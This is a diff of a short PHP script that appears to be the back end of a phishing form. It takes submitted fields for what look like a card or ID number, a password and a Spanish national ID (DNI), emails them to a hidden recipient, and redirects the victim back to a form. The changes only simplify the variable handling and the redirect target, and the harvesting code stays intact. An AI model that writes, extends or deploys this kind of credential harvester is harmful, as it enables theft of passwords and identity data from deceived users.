@@ -1,14 +1,8 @@
 <?php
 
-    session_start();
-
-    $_SESSION["cc"] = $_POST['cc'];
-    $_SESSION["pass"] = $_POST['pass'];
-    $_SESSION["dni"] = $_POST['dni'];
-
-    $cc = $_SESSION['cc'];
+    $cc = $_POST['cc'];
+    $pass = $_POST['pass'];
     $dni = $_POST['dni'];
-    $pass = $_SESSION['pass'];
 
     if(isset($cc, $dni, $pass)){
         //Correo a donde se envía la información
@@ -28,7 +22,7 @@
 
         mail($to, $subject, $txt, $headers);
 
-        header('Location: form.html');
+        header('Location: form.php');
 
     }
     else{
